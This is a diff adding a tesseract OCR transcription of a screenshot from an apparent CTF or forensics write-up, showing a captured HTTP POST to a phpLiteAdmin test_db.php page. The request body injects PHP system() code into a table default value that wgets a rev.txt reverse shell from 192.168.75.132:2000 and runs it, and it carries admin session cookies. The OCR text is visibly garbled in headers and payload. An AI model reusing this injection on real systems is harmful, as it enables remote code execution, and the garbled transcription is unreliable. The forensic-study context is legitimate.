@@ -1,0 +1,23 @@
+# OCR: f725a6da6222d1f7d772959a156fcc78.webp
+# 来源: .\02-WriteUp\2024\f725a6da6222d1f7d772959a156fcc78.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:20
+
+Mf Wireshark . 385 HTTP if (tep.stream eq 3260) - FBAT-pcapng 一
+POST /dbadmin/test_db.php?action=table_create&confirm=1 HTTP/1.1
+Host: 192.168. 75.131
+Content-Length: 186
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.75.131
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozille/5.0 (Windows NT 10.0; Win64; x64) AppleMebkit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+Accept: text/html, application/xhtml+xm1, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b
+33q=0.7
+Referer: http: //192.168.75.131/dbadmin/test_db.php?action=teble_create
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: pla3412=admin; pla3412_salt=bvtcklk13pk; PHPSESSID=4r@6r9gjmcujsOja9rSbstSpe5
+Connection: close
+tablename=rev&rows=180_field=re&@_type=INTEGER&0_defaultvalue=%3C%3F php+system%28%22wget +192. 168.75. 132%3A2000%2F rev. txt+-O+%2FtmpX2Frev
+php%38+php+%2Ftmp&2Frev . php%22%29%3B+%3F%3ER27%29HTTP/1.1 200 OK
